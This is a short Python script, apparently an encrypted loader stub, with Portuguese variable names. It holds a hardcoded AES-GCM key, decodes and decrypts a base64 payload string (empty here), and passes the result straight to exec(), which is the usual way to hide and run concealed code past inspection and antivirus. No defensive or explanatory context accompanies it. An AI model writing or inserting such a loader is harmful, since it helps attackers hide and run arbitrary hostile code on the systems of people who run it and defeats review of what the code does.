import base64, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

chave = b'1\xff\xa0\x9b\x01J\x17\xacA\xa1\xed\x1b\xb5\x9d\xa9\xd45\xdbv\xe7\xee\x0f\xf2A\xf9\x08\xc4x6g/\xf9'
payload_b64 = ""

payload = base64.b64decode(payload_b64)
nonce = payload[:12]
dados_criptografados = payload[12:]

aesgcm = AESGCM(chave)
codigo = aesgcm.decrypt(nonce, dados_criptografados, None)
exec(codigo.decode())
